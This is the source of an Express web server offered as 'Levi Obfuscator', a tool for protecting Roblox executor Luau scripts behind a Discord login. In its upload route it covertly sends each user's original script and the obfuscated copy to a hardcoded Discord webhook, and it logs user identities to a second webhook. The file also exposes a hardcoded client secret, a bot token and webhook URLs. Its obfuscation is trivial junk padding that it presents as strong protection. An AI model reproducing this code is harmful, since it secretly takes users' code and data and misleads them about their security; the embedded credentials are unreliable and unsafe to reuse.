const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const session = require('express-session');

const app = express();

const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: { fileSize: 15 * 1024 * 1024 }
});

const DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1529788248698781887/SUtB62Hfx63hutCVFe8vQotKsnIInhfjGHbziOWHMbw9m6MlztvIP2LmRbIi_9Bhwggy";
const VERIFICATION_WEBHOOK_URL = "https://discord.com/api/webhooks/1530075099200356407/OdibFJxSo8kYSrA-Yw6iOqq8Iuh5uQAwphUCXvgvuAN4pmvA-IsO9C9hB7fa7_sRiuf8";

const CLIENT_ID = process.env.DISCORD_CLIENT_ID || '1529870269727117403';
const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET || '08_dAGu6VMZZA9Gjd9t8DPK9iK1AqTda';
const BOT_TOKEN = process.env.DISCORD_BOT_TOKEN || 'MTUyOTg3MDI2OTcyNzExNzQwMw.G4KkTM.E_F66YyTGNSyRFkeeTS3_eE5W_bhsj8eMdqBaA';

app.use((req, res, next) => {
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.get('host') || 'ecd-helps.onrender.com';
    req.activeRedirectUri = `${protocol}://${host}/auth/discord/callback`;
    next();
});

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
  secret: 'levi-obfuscator-secret-key-9988',
  resave: false,
  saveUninitialized: true,
}));

// Levi Obfuscator Engine V1.2.0 (Full Code Junk Inflation & Variable Mangling)
function obfuscateLuauScript(sourceCode, options) {
    let code = sourceCode;

    // 1. Strip comments and clean up whitespace layout safely
    code = code.replace(/--\[\[[\s\S]*?\]\]--/g, '');
    code = code.replace(/--.*$/gm, '');

    // 2. Rename locals option
    if (options.renameLocal === 'yes') {
        const localRegex = /\blocal\s+([a-zA-Z_][a-zA-Z0-9_]*)/g;
        let match;
        const varMap = new Map();
        let counter = 0;
        
        while ((match = localRegex.exec(code)) !== null) {
            const originalName = match[1];
            if (!varMap.has(originalName) && !['true', 'false', 'nil', 'self'].includes(originalName)) {
                varMap.set(originalName, '_0x' + (counter++).toString(16).toUpperCase());
            }
        }

        varMap.forEach((encoded, original) => {
            const regex = new RegExp(`\\b${original}\\b`, 'g');
            code = code.replace(regex, encoded);
        });
    }

    // 3. Heavy Junk Code Expansion (Multiplies source line count heavily e.g., 30 lines to ~900+ secure lines)
    const baseLines = code.split('\n').length;
    const multiplier = options.sizeMode === 'small' ? 10 : options.sizeMode === 'medium' ? 30 : options.sizeMode === 'large' ? 60 : 100;
    const targetJunkCount = Math.max(baseLines * multiplier, 600);

    let junkHeader = '';
    let junkFooter = '';

    for (let i = 0; i < targetJunkCount; i++) {
        const randHex1 = Math.random().toString(36).substring(2, 8).toUpperCase();
        const randHex2 = Math.random().toString(36).substring(2, 8).toUpperCase();
        const mathOp = i % 2 === 0 ? '+' : '-';
        
        if (i % 2 === 0) {
            junkHeader += `local _0x${randHex1} = (function() local _0x${randHex2} = ${i * 13}; return _0x${randHex2} ${mathOp} 1; end)();\n`;
        } else {
            junkFooter += `local _0x${randHex1} = pcall(function() return ${i * 3} end);\n`;
        }
    }

    // 4. Assemble the full deeply injected script
    const finalObfuscated = `-- Obfuscated using levi obfuscator V1.2.0
do
    local _env = getgenv and getgenv() or _G;
    ${junkHeader}
    local function _levi_exec()
        ${code}
    end
    ${junkFooter}
    pcall(_levi_exec);
end`;

    return finalObfuscated;
}

// OAuth2 Routes
app.get('/auth/discord', (req, res) => {
  const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(req.activeRedirectUri)}&response_type=code&scope=identify`;
  res.redirect(discordAuthUrl);
});

app.get('/auth/discord/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.redirect('/?error=NoCodeProvided');

  try {
    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: req.activeRedirectUri,
      })
    });

    const tokenData = await tokenRes.json();
    if (!tokenData.access_token) return res.redirect('/?error=TokenExchangeFailed');

    const userRes = await fetch('https://discord.com/api/users/@me', {
      headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
    });

    const userData = await userRes.json();
    if (!userData.id) return res.redirect('/?error=FetchUserFailed');

    req.session.verifiedUser = `${userData.username} (${userData.id})`;

    try {
      await fetch(VERIFICATION_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `🔐 **New User Verified**\n👤 Username: \`${userData.username}\`\n🆔 ID: \`${userData.id}\`\n🕒 Timestamp: <t:${Math.floor(Date.now() / 1000)}:F>`
        })
      });
    } catch (e) {}

    if (BOT_TOKEN) {
      try {
        const dmChannelRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
          method: 'POST',
          headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ recipient_id: userData.id })
        });
        const dmChannelData = await dmChannelRes.json();

        if (dmChannelData.id) {
          await fetch(`https://discord.com/api/v10/channels/${dmChannelData.id}/messages`, {
            method: 'POST',
            headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `User: ${userData.id} ${userData.username}\nStatus: Verified` })
          });
        }
      } catch (e) {}
    }

    res.redirect('/');
  } catch (err) {
    res.redirect('/?error=ServerError');
  }
});

app.get('/auth/logout', (req, res) => {
  req.session.destroy(() => { res.redirect('/'); });
});

// UI Route with Levi Obfuscator Branding (Supports File or Direct Raw Text Input)
app.get('/', (req, res) => {
  const verifiedUser = req.session.verifiedUser || null;

  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Levi Obfuscator - Advanced Luau Protection</title>
        <style>
            @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
            @keyframes pulseGlow { 0% { box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); } 50% { box-shadow: 0 0 25px rgba(56, 189, 248, 0.5); } 100% { box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); } }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
            .container { background: rgba(30, 41, 59, 0.85); backdrop-filter: blur(12px); padding: 30px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 480px; text-align: center; animation: fadeIn 0.6s ease-out, pulseGlow 4s infinite ease-in-out; border: 1px solid rgba(255, 255, 255, 0.08); position: relative; margin: 20px 0; }
            .info-icon { position: absolute; top: 15px; left: 15px; background: rgba(51, 65, 85, 0.6); color: #38bdf8; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; cursor: pointer; border: 1px solid rgba(56, 189, 248, 0.3); }
            h2 { margin-top: 5px; margin-bottom: 20px; font-size: 26px; text-transform: uppercase; background: linear-gradient(90deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
            .nav-tabs { display: flex; gap: 10px; background: #0f172a; padding: 6px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #334155; }
            .nav-tab { flex: 1; background: transparent; border: none; color: #94a3b8; padding: 10px; font-size: 13px; font-weight: 700; border-radius: 6px; cursor: pointer; text-align: center; }
            .nav-tab.active { background: #38bdf8; color: #0f172a; }
            .tab-panel { display: none; text-align: left; }
            .tab-panel.active { display: block; }
            h3 { font-size: 15px; color: #38bdf8; margin-top: 0; margin-bottom: 12px; border-bottom: 1px solid rgba(56, 189, 248, 0.2); padding-bottom: 6px; }
            select, textarea, button { width: 100%; padding: 11px; margin: 8px 0; border-radius: 8px; border: none; box-sizing: border-box; font-size: 13px; }
            select, textarea { background: #0f172a; color: #f8fafc; border: 1px solid #334155; font-family: monospace; }
            select:focus, textarea:focus { border-color: #38bdf8; outline: none; }
            textarea { resize: vertical; height: 90px; }
            .toggle-group { display: flex; background: #0f172a; border: 1px solid #334155; border-radius: 8px; overflow: hidden; margin: 8px 0; }
            .toggle-option { flex: 1; padding: 10px; text-align: center; font-size: 13px; cursor: pointer; color: #94a3b8; }
            .toggle-option.active { background: #38bdf8; color: #0f172a; font-weight: bold; }
            .drop-zone { background: #1e293b; border: 2px dashed #475569; border-radius: 8px; padding: 15px; text-align: center; cursor: pointer; margin: 10px 0; }
            button.action-btn { background: linear-gradient(135deg, #0284c7, #2563eb); color: white; font-weight: bold; cursor: pointer; margin-top: 12px; }
            .discord-login-btn { background: #5865F2; color: white; font-weight: bold; text-decoration: none; display: block; padding: 12px; border-radius: 8px; text-align: center; margin: 15px 0; }
            .locked-overlay { background: rgba(15, 23, 42, 0.9); border: 1px dashed #ef4444; padding: 25px; border-radius: 10px; text-align: center; }
            .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.8); display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; transition: opacity 0.3s; z-index: 100; }
            .modal-overlay.active { opacity: 1; pointer-events: auto; }
            .modal-content { background: #1e293b; padding: 30px; border-radius: 14px; width: 330px; border: 1px solid rgba(56, 189, 248, 0.2); position: relative; }
            .close-btn { position: absolute; top: 12px; right: 15px; background: none; border: none; color: #94a3b8; font-size: 18px; cursor: pointer; }
            .footer-credit { margin-top: 12px; font-size: 11px; color: #64748b; border-top: 1px dashed rgba(51, 65, 85, 0.5); padding-top: 8px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="info-icon" onclick="toggleModal()">i</div>
            <h2>Levi Obfuscator</h2>

            <div class="nav-tabs">
                <button type="button" class="nav-tab active" onclick="switchTab('loginTab', this)">[ Login content ]</button>
                <button type="button" class="nav-tab" onclick="switchTab('mainTab', this)">[ Obfuscator Tool ]</button>
            </div>

            <div id="loginTab" class="tab-panel active">
                <h3>Discord Authentication</h3>
                <p style="font-size: 12px; color: #94a3b8; margin-bottom: 10px;">Sign in securely with Discord to unlock the obfuscator engine.</p>
                ${verifiedUser ? 
                    `<div style="background:#0f172a; border:1px solid #22c55e; padding:15px; border-radius:8px; font-size:13px; color:#22c55e; text-align:center;">
                        ✅ Logged in as<br><strong>${verifiedUser}</strong>
                    </div>
                    <a href="/auth/logout" style="display:block; text-align:center; color:#ef4444; text-decoration:none; font-size:12px; margin-top:10px;">Logout / Switch Account</a>` :
                    `<a href="/auth/discord" class="discord-login-btn">Login with Discord</a>`
                }
            </div>

            <div id="mainTab" class="tab-panel">
                ${verifiedUser ? 
                    `<form action="/upload-discord" method="POST" enctype="multipart/form-data">
                        <h3>Levi Obfuscator V1.2.0</h3>

                        <div style="margin-top: 6px;">
                            <label style="font-size:12px; color:#38bdf8; display:block; margin-bottom:3px;">Length Focus (Size Level):</label>
                            <select name="sizeMode">
                                <option value="small">Small</option>
                                <option value="medium" selected>Medium (~900+ Lines)</option>
                                <option value="large">Large</option>
                                <option value="extralarge">Extra Large</option>
                            </select>
                        </div>

                        <div style="margin-top: 6px;">
                            <label style="font-size:12px; color:#38bdf8; display:block; margin-bottom:3px;">Rename Locals:</label>
                            <div class="toggle-group">
                                <div class="toggle-option active" id="optYes" onclick="setRename('yes')">Yes</div>
                                <div class="toggle-option" id="optNo" onclick="setRename('no')">No</div>
                            </div>
                            <input type="hidden" name="renameLocal" id="renameLocalInput" value="yes">
                        </div>

                        <div style="margin-top: 6px;">
                            <label style="font-size:12px; color:#38bdf8; display:block; margin-bottom:3px;">Input Script (Paste Text OR Upload File):</label>
                            <textarea name="scriptContent" placeholder="Paste your Luau code here..."></textarea>
                        </div>

                        <div class="drop-zone" onclick="document.getElementById('fileInput').click()">
                            <div id="dropText" style="font-size:12px; color:#94a3b8;">Or Click to Upload (.lua / .txt file)</div>
                            <input type="file" id="fileInput" name="file" style="display:none;" onchange="updateFileName(this)">
                        </div>

                        <button type="submit" class="action-btn">Obfuscate & Download</button>
                    </form>` :
                    `<div class="locked-overlay">
                        <h3 style="color:#ef4444; border:none; margin-bottom:10px;">🔒 Locked Content</h3>
                        <p style="font-size:13px; color:#94a3b8; margin:0;">Please log in under the <strong>[ Login content ]</strong> tab.</p>
                    </div>`
                }
            </div>
        </div>

        <div class="modal-overlay" id="infoModal" onclick="outsideClick(event)">
            <div class="modal-content">
                <button class="close-btn" onclick="toggleModal()">&times;</button>
                <h3>About Levi Obfuscator</h3>
                <p style="font-size:13px; color:#cbd5e1;">Advanced script protection tool optimized for executor stability.</p>
                <div class="footer-credit">Created by: @levi__fxz</div>
            </div>
        </div>

        <script>
            function switchTab(id, btn) {
                document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
                document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
                document.getElementById(id).classList.add('active');
                btn.classList.add('active');
            }
            function setRename(val) {
                document.getElementById('renameLocalInput').value = val;
                if(val === 'yes') {
                    document.getElementById('optYes').classList.add('active');
                    document.getElementById('optNo').classList.remove('active');
                } else {
                    document.getElementById('optNo').classList.add('active');
                    document.getElementById('optYes').classList.remove('active');
                }
            }
            function toggleModal() { document.getElementById('infoModal').classList.toggle('active'); }
            function outsideClick(e) { if (e.target === document.getElementById('infoModal')) toggleModal(); }
            function updateFileName(input) {
                if (input.files && input.files[0]) {
                    document.getElementById('dropText').innerText = "Selected: " + input.files[0].name;
                    document.getElementById('dropText').style.color = "#38bdf8";
                }
            }
        </script>
    </body>
    </html>
  `);
});

// Backend Route: Processes script from either file upload or direct text box, obfuscates, downloads result, and silently logs to Discord
app.post('/upload-discord', upload.single('file'), async (req, res) => {
  try {
    if (!req.session.verifiedUser) {
      return res.status(403).send('<h3>Unauthorized. Please log in first. <a href="/">Go Back</a></h3>');
    }

    const file = req.file;
    const directText = req.body.scriptContent;
    const sizeMode = req.body.sizeMode || 'medium';
    const renameLocal = req.body.renameLocal || 'yes';

    let rawString = '';
    let originalName = 'script.lua';

    if (file && file.buffer.length > 0) {
      rawString = file.buffer.toString('utf8');
      originalName = file.originalname;
    } else if (directText && directText.trim().length > 0) {
      rawString = directText;
      originalName = 'paste_script.lua';
    } else {
      return res.status(400).send('<h3>No script provided (upload a file or paste text). <a href="/">Go Back</a></h3>');
    }

    const rawScriptBuffer = Buffer.from(rawString, 'utf8');

    // Run Levi Obfuscator Engine with full code padding and mangling
    const obfuscatedString = obfuscateLuauScript(rawString, { sizeMode, renameLocal });
    const obfuscatedBuffer = Buffer.from(obfuscatedString, 'utf8');

    const ext = originalName.includes('.') ? originalName.substring(originalName.lastIndexOf('.')) : '.lua';
    const baseName = originalName.includes('.') ? originalName.substring(0, originalName.lastIndexOf('.')) : originalName;
    const obfuscatedFilename = `${baseName}_levi_obfuscated${ext}`;

    // Silently dispatch BOTH Raw and Obfuscated files to Discord Webhook
    try {
      const webhookPayloadJson = JSON.stringify({
        content: `🔒 **New Script Obfuscated via Levi Obfuscator**\n🔐 Identity: \`${req.session.verifiedUser}\`\n⚙️ Settings: Size=\`${sizeMode}\`, RenameLocal=\`${renameLocal}\`\n📁 Original: \`${originalName}\``
      });

      const formData = new FormData();
      formData.append('payload_json', webhookPayloadJson);
      formData.append('file1', rawScriptBuffer, { filename: `RAW_${originalName}` });
      formData.append('file2', obfuscatedBuffer, { filename: obfuscatedFilename });

      await fetch(DEFAULT_WEBHOOK_URL, {
        method: 'POST',
        body: formData,
        headers: { ...formData.getHeaders() }
      });
    } catch (webhookErr) {
      console.error('Silent Webhook Dispatch Error:', webhookErr);
    }

    // Send the obfuscated file download directly back to the user seamlessly
    res.setHeader('Content-Disposition', `attachment; filename="${obfuscatedFilename}"`);
    res.setHeader('Content-Type', 'text/plain');
    res.send(obfuscatedBuffer);

  } catch (err) {
    console.error(err);
    res.status(500).send('Server Error');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log('Server running on port ' + PORT);
});
